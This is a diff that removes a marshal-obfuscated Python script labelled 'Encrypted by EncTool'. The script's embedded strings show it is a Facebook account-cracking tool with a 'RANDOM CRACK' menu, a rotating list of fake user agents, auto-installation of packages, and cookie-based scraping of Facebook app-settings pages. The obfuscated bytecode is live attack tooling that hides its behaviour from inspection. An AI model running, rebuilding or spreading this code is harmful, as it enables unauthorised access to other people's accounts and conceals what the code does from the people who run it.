@@ -1,4 +1,2535 @@
-#Encrypted by EncTool
-#samifire
-import marshal
-exec(marshal.loads(b'\xe3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\xf3\xd2\x02\x00\x00\x97\x00d\x00d\x01l\x00Z\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\t\x00d\x00d\x01l\x02Z\x02n&#\x00e\x03$\x00r\x1e\x01\x00\x02\x00e\x04d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\t\x00d\x00d\x01l\x05Z\x06n&#\x00e\x03$\x00r\x1e\x01\x00\x02\x00e\x04d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01\t\x00d\x00d\x01l\x07Z\x07n&#\x00e\x03$\x00r\x1e\x01\x00\x02\x00e\x04d\x07\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x08\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01d\x00d\x01l\x02Z\x02d\x00d\x01l\x07Z\x07d\x00d\x01l\x08Z\x08d\x00d\x01l\tZ\td\x00d\x01l\nZ\nd\x00d\x01l\x0bZ\x0bd\x00d\x01l\x0cZ\x0cd\x00d\x01l\rZ\rd\x00d\x01l\x0eZ\x0ed\x00d\x01l\x0fZ\x0fd\x00d\x01l\x10Z\x10d\x00d\tl\x07m\x11Z\x12\x01\x00d\x00d\nl\x05m\x13Z\x14\x01\x00d\x00d\x01l\x15Z\x15d\x00d\x01l\x00Z\x00d\x00d\x01l\tZ\td\x00d\x01l\x0cZ\x0cd\x00d\x01l\x08Z\x08d\x00d\x01l\nZ\nd\x00d\x01l\rZ\rd\x00d\x01l\x16Z\x16d\x00d\x01l\x0fZ\x0fd\x00d\x01l\x15Z\x15\t\x00d\x00d\x01l\x02Z\x02d\x00d\nl\x05m\x13Z\x17\x01\x00d\x00d\x01l\x18Z\x18d\x00d\x0bl\x19m\x1aZ\x1a\x01\x00n+#\x00e\x1b$\x00r#\x01\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x0c\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02\x00e\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\r\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00Y\x00n\x04w\x00x\x03Y\x00w\x01g\x00d\x0e\xa2\x01a\x1cd\x0fZ\x1dd\x00a\x1ed\x00a\x1eg\x00a\x1fg\x00Z d\x10\x84\x00Z!d\x11\x84\x00Z"d\x12\x84\x00Z#d\x13\x84\x00Z$d\x14\x84\x00Z%d\x15\x84\x00Z&d\x16\x84\x00Z%\x02\x00e!\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x01S\x00)\x17\xe9\x00\x00\x00\x00NzGxdg-open https://youtube.com/@official-shahzada-786?si=kC4QhJHh8v2PTjPOu)\x00\x00\x00\n [\xc3\x97] requests module not installed!...\nz\x14pip install requestsu(\x00\x00\x00\n [\xc3\x97] Futures module not installed!...\nz\x13pip install futuresu$\x00\x00\x00\n [\xc3\x97] Bs4 module not installed!...\nz\x0fpip install bs4)\x01\xda\rBeautifulSoup)\x01\xda\x12ThreadPoolExecutor)\x01\xda\x0fConnectionErrorz5pip install mechanize requests futures==2 > /dev/nullz\rpython num.py)\x05z\xa6Mozilla/5.0 (Linux; U; Android 1.6; ar-us; SonyEricssonX10i Build/R2BA026) AppleWebKit/528.5+ (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36a\xb4\x13\x00\x00Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3) Gecko/20090305 Firefox/3.1b3 GTB5Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.5; ko; rv:1.9.1b2) Gecko/20081201 Firefox/3.1b2Mozilla/5.0 (X11; U; SunOS sun4u; en-US; rv:1.9b5) Gecko/2008032620 Firefox/3.0b5Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.8.1.12) Gecko/20080214 Firefox/2.0.0.12Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8Mozilla/5.0 (X11; U; OpenBSD i386; en-US; rv:1.8.0.5) Gecko/20060819 Firefox/1.5.0.5Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3Mozilla/5.0 (Windows; U; WinNT4.0; en-US; rv:1.7.9) Gecko/20050711 Firefox/1.0.5Mozilla/5.0 (Windows; Windows NT 6.1; rv:2.0b2) Gecko/20100720 Firefox/4.0b2Mozilla/5.0 (X11; Linux x86_64; rv:2.0b4) Gecko/20100818 Firefox/4.0b4Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2) Gecko/20100308 Ubuntu/10.04 (lucid) Firefox/3.6 GTB7.1Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7) Gecko/20101111 Firefox/4.0b7Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b8pre) Gecko/20101114 Firefox/4.0b8preMozilla/5.0 (X11; Linux x86_64; rv:2.0b9pre) Gecko/20110111 Firefox/4.0b9preMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b9pre) Gecko/20101228 Firefox/4.0b9preMozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.2a1pre) Gecko/20110324 Firefox/4.2a1preMozilla/5.0 (X11; U; Linux amd64; rv:5.0) Gecko/20100101 Firefox/5.0 (Debian)Mozilla/5.0 (Windows NT 6.1; WOW64; rv:6.0a2) Gecko/20110613 Firefox/6.0a2Mozilla/5.0 (X11; Linux i686 on x86_64; rv:12.0) Gecko/20100101 Firefox/12.0Mozilla/5.0 (Windows NT 6.1; rv:15.0) Gecko/20120716 Firefox/15.0a2Mozilla/5.0 (X11; Ubuntu; Linux armv7l; rv:17.0) Gecko/20100101 Firefox/17.0Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130328 Firefox/21.0Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:22.0) Gecko/20130328 Firefox/22.0Mozilla/5.0 (Windows NT 5.1; rv:25.0) Gecko/20100101 Firefox/25.0Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:25.0) Gecko/20100101 Firefox/25.0Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0Mozilla/5.0 (X11; Linux i686; rv:30.0) Gecko/20100101 Firefox/30.0Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:58.0) Gecko/20100101 Firefox/58.0Opera/5.11 (Windows 98; U) [en]Mozilla/4.0 (compatible; MSIE 5.0; Windows 98) Opera 5.12 [en]Opera/6.0 (Windows 2000; U) [fr]Mozilla/4.0 (compatible; MSIE 5.0; Windows NT 4.0) Opera 6.01 [en]Opera/7.03 (Windows NT 5.0; U) [en]Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Opera 7.10 [en]Opera/9.02 (Windows XP; U; ru)Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.24Opera/9.51 (Macintosh; Intel Mac OS X; U; en)Opera/9.70 (Linux i686 ; U; en) Presto/2.2.1Opera/9.80 (Windows NT 5.1; U; cs) Presto/2.2.15 Version/10.00Opera/9.80 (Windows NT 6.1; U; sv) Presto/2.7.62 Version/11.01Opera/9.80 (Windows NT 6.1; U; en-GB) Presto/2.7.62 Version/11.00Opera/9.80 (Windows NT 6.1; U; zh-tw) Presto/2.7.62 Version/11.01Opera/9.80 (Windows NT 6.0; U; en) Presto/2.8.99 Version/11.10Opera/9.80 (X11; Linux i686; U; ru) Presto/2.8.131 Version/11.11Opera/9.80 (Windows NT 5.1) Presto/2.12.388 Version/12.14Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453.12 Safari/537.36 OPR/14.0.1116.4Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.29 Safari/537.36 OPR/15.0.1147.24 (Edition Next)Opera/9.80 (Linux armv6l ; U; CE-HTML/1.0 NETTV/3.0.1;; en) Presto/2.6.33 Version/10.60Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36 OPR/20.0.1387.91Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Oupeng/10.2.1.86910 Safari/534.30Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2376.0 Safari/537.36 OPR/31.0.1857.0Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36 OPR/32.0.1948.25Mozilla/5.0 (iPad; CPU OS 6_0_1 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A523 [FBAN/FBIOS;FBAV/6.0.1;FBBV/180945;FBDV/iPad2,1;FBMD/iPad;FBSN/iPhone OS;FBSV/6.0.1;FBSS/1; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]Mozilla/5.0 (Linux; Android 4.4.2; VS880 Build/KOT49I.VS88012A) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/28.0.0.20.16;]Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]Mozilla/5.0 (X11; U; Linux armv7l like Android; en-us) AppleWebKit/531.2+ (KHTML, like Gecko) Version/5.0 Safari/533.2+ Kindle/3.0+z\x80Mozilla/5.0 (Nintendo Switch; WifiWebAuthApplet) AppleWebKit/601.6 (KHTML, like Gecko) NF/4.0.0.5.10 NintendoBrowser/5.1.0.13343z\x92Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox Series X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.82 Safari/537.36 Edge/20.02z\x8eMozilla/5.0 (Linux; Android 5.1; AFTS Build/LMY47O) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/41.99900.2250.0242 Safari/537.36a=\x02\x00\x00\n\n\x1b[1;36m   ######     ###    ##     ## #### \n\x1b[1;33m  ##    ##   ## ##   ###   ###  ##  \n\x1b[1;31m  ##        ##   ##  #### ####  ##  \n\x1b[1;32m   ######  ##     ## ## ### ##  ##  \n\x1b[1;33m        ## ######### ##     ##  ##  \n\x1b[1;31m  ##    ## ##     ## ##     ##  ##  \n\x1b[1;36m   ######  ##     ## ##     ## #### \n\x1b[1;37m [\x1a]=====================[\x1a]=========================\n\x1b[1;36m [\x1a]CREATED BY   :  SAMI KHAN\n\x1b[1;34m [\x1a] ON GITHUB    :  SAMI-JAANI\n\x1b[1;37m [\x1a] TOOL STATUS  :  RANDOM\n\x1b[1;32m [\x1a]TOOL VIRSION :  0.1\n\x1b[1;37m [\x1a]=====================[\x1a]=========================c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\xfa\x00\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00|\x00d\x05k\x02\x00\x00\x00\x00r\x10t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00d\x00S\x00)\x06N\xda\x05clear\xfa/-----------------------------------------------z\x19\x1b[1;39m [1] RANDOM CRACK\x1az\x16\x1b[1;32m [\x1a] CHOOSE\x1a : \xda\x011)\x06\xda\x02os\xda\x06system\xda\x05print\xda\x04logo\xda\x05input\xda\x0crandom_crack\xa9\x01\xda\x03opts\x01\x00\x00\x00 \xda\x00\xda\x04menur\x13\x00\x00\x00\xe2\x00\x00\x00sm\x00\x00\x00\x80\x00\xe5\x01\x03\x84\x19\x887\xd1\x01\x13\xd4\x01\x13\xd0\x01\x13\xe5\x01\x06\x85t\x81\x1b\x84\x1b\x80\x1b\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x01\x06\xd0\x07%\xd1\x01&\xd4\x01&\xd0\x01&\xe5\x01\x06\x80v\x81\x1d\x84\x1d\x80\x1d\xe5\x07\x0c\xd0\r(\xd1\x07)\xd4\x07)\x80\x13\xe0\x04\x07\x88#\x82I\x80I\xe5\x02\x0e\x81.\x84.\x80.\x80.\x80.\xf0\x05\x00\x05\x0e\x80I\xf3\x00\x00\x00\x00c\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\x00\x00\xf3\x92\x04\x00\x00\x97\x00t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x01d\x02|\x00i\x01\xac\x03\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x01t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x02\x02\x00|\x02j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xac\x07\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x03d\x08\x84\x00|\x03\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\nk\x02\x00\x00\x00\x00r1t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0bt\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x05z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00nst\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0ct\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]?}\x05t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\rt\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05d\x0ez\x00\x00\x00|\x04|\x05\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x0fd\x10\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x04z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c@t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x11d\x02|\x00i\x01\xac\x03\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00j\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x01t\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x01d\x04\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x02\x02\x00|\x02j\x04\x00\x00\x00\x00\x00\x00\x00\x00d\x05d\x06\xac\x07\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00}\x03d\x12\x84\x00|\x03\xa0\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\t\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00}\x04t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00d\nk\x02\x00\x00\x00\x00r2t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x13t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x05z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x14t\x12\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x17\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00D\x00]?}\x05t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\rt\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00|\x05d\x0ez\x00\x00\x00|\x04|\x05\x19\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa0\x0c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x15d\x16\xa6\x02\x00\x00\xab\x02\x00\x00\x00\x00\x00\x00\x00\x00t\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00f\x04z\x06\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x8c@t\x0f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x17\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00)\x18Nz7https://m.facebook.com/settings/apps/tabbed/?tab=active\xda\x06cookie)\x01\xda\x07cookiesz\x0bhtml.parser\xda\x04form\xda\x04post)\x01\xda\x06methodc\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x13\x00\x00\x00\xf3\x1c\x00\x00\x00\x97\x00g\x00|\x00]\t}\x01|\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\nS\x00\xa9\x00\xa9\x01\xda\x04text\xa9\x02\xda\x02.0\xda\x01is\x02\x00\x00\x00  r\x12\x00\x00\x00\xfa\n<listcomp>z\x1bcek_apk.<locals>.<listcomp>\xfe\x00\x00\x00\xf3\x1a\x00\x00\x00\x80\x00\xd0\x0b-\xd0\x0b-\xd0\x0b-\x90q\x88A\x8cF\xd0\x0b-\xd0\x0b-\xd0\x0b-r\x14\x00\x00\x00\xda\x02h3r\x02\x00\x00\x00z.\r %s[%s!%s] %sSorry there is no Active Apk%s  u7\x00\x00\x00\r \xc3\x83\xc2\xb0\xc3\x85\xc2\xb8\xc3\x85\xc2\xbd\xc3\x82\xc2\xae  %sYour Active Application Details :z\x0c\r %s%s. %s%s\xe9\x01\x00\x00\x00z\x10Ditambahkan padaz\x11 Ditambahkan padaz9https://m.facebook.com/settings/apps/tabbed/?tab=inactivec\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x13\x00\x00\x00\xf3\x1c\x00\x00\x00\x97\x00g\x00|\x00]\t}\x01|\x01j\x00\x00\x00\x00\x00\x00\x00\x00\x00\x91\x02\x8c\nS\x00r\x1c\x00\x00\x00r\x1d\x00\x00\x00r\x1f\x00\x00\x00s\x02\x00\x00\x00  r\x12\x00\x00\x00r"\x00\x00\x00z\x1bcek_apk.<locals>.<listcomp>\x16\x01\x00\x00r#\x00\x00\x00r\x14\x00\x00\x00z0\r %s[%s!%s] %sSorry no Expired Apk%s           \nu8\x00\x00\x00\r \xc3\x83\xc2\xb0\xc3\x85\xc2\xb8\xc3\x85\xc2\xbd\xc3\x82\xc2\xae  %sYour Expired Application Details :\xda\x0bKedaluwarsaz\x0c Kedaluwarsa\xfa\x01\r)\r\xda\x07session\xda\x03getr\x1e\x00\x00\x00r\x03\x00\x00\x00\xda\x04find\xda\x08find_all\xda\x03lenr\x0c\x00\x00\x00\xda\x01N\xda\x01M\xda\x01H\xda\x05range\xda\x07replace)\x06\xda\x04coki\xda\x01w\xda\x03sop\xda\x01x\xda\x04gamer!\x00\x00\x00s\x06\x00\x00\x00      r\x12\x00\x00\x00\xda\x07cek_apkr8\x00\x00\x00\xf6\x00\x00\x00s\x18\x02\x00\x00\x80\x00\xe5\x06\r\x87k\x82k\xd0\x12K\xd0U]\xd0^b\xd0Tc\x80k\xd1\x06d\xd4\x06d\xd4\x06i\x80A\xe5\n\x17\x98\x01\x98-\xd1\n(\xd4\n(\x80C\xe0\x08\x10\x88\x03\x8c\x08\x90\x16\x98v\xd0\x08&\xd1\x08&\xd4\x08&\x80A\xe0\x0b-\xd0\x0b-\x98A\x9fJ\x9aJ\xa0t\xd1\x1c,\xd4\x1c,\xd0\x0b-\xd1\x0b-\xd4\x0b-\x80D\xe5\x07\n\x884\x81y\x84y\x90!\x82|\x80|\xe5\x08\r\xd0\x0e@\xc5!\xc5A\xc5a\xcd\x01\xcd!\xc0\x1b\xd1\x0eL\xd1\x08M\xd4\x08M\xd0\x08M\xd0\x08M\xf5\x08\x00\t\x0e\xd0\x0eI\xcd1\xd1\x0eM\xd1\x08N\xd4\x08N\xd0\x08N\xe5\x11\x16\x95s\x984\x91y\x94y\xd1\x11!\xd4\x11!\xf0\x00\x02\tf\x01\xf0\x00\x02\tf\x01\x88A\xe5\x0c\x11\xd0\x12"\xa5A\xa0a\xa8\x01\xa1c\xa8$\xa8q\xac\'\xaf/\xaa/\xd0:L\xd0M`\xd1*a\xd4*a\xd5bc\xd0#d\xd1\x12d\xd1\x0ce\xd4\x0ce\xd0\x0ce\xd0\x0ce\xf5\x0c\x00\x07\x0e\x87k\x82k\xd0\x12M\xd0W_\xd0`d\xd0Ve\x80k\xd1\x06f\xd4\x06f\xd4\x06k\x80A\xe5\n\x17\x98\x01\x98-\xd1\n(\xd4\n(\x80C\xe0\x08\x10\x88\x03\x8c\x08\x90\x16\x98v\xd0\x08&\xd1\x08&\xd4\x08&\x80A\xe0\x0b-\xd0\x0b-\x98A\x9fJ\x9aJ\xa0t\xd1\x1c,\xd4\x1c,\xd0\x0b-\xd1\x0b-\xd4\x0b-\x80D\xe5\x07\n\x884\x81y\x84y\x90!\x82|\x80|\xe5\x08\r\xd0\x0eC\xc5Q\xc5q\xcd\x11\xcd1\xcdQ\xc0K\xd1\x0eO\xd1\x08P\xd4\x08P\xd0\x08P\xd0\x08P\xd0\x08P\xf5\x08\x00\t\x0e\xd0\x0eJ\xcdA\xd1\x0eN\xd1\x08O\xd4\x08O\xd0\x08O\xe5\x11\x16\x95s\x984\x91y\x94y\xd1\x11!\xd4\x11!\xf0\x00\x06\t\x19\xf0\x00\x06\t\x19\x88A\xe5\x0c\x11\xd0\x12"\xa5A\xa0a\xa8\x01\xa1c\xa8$\xa8q\xac\'\xaf/\xaa/\xb8-\xc8\x0e\xd1*W\xd4*W\xd5XY\xd0#Z\xd1\x12Z\xd1\x0c[\xd4\x0c[\xd0\x0c[\xd0\x0c[\xf5\x08\x00\r\x12\x90%\x89L\x8cL\x88L\x88L\x88Lr\x14\x00\x00\x00c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\x00\x00\xf3\xac\x01\x00\x00\x97\x00t\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00j\x01\x00\x00\x00\x00\x00\x00\x00\x00d\x01\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00t\x06\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x03\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x04\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x05\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x02\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00t\t\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00d\x06\xa6\x01\x00\x00\xab\x01\x00\x00\x00\x00\x00\x00\x00\x00}\x00|\x00d\x07k\x02\x00\x00\x00\x00r\x10t\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00d\x00S\x00|\x00d\x08k\x02\x00\x00\x00\x00r\x10t\r\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa6\x00\x00\x00\xab\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\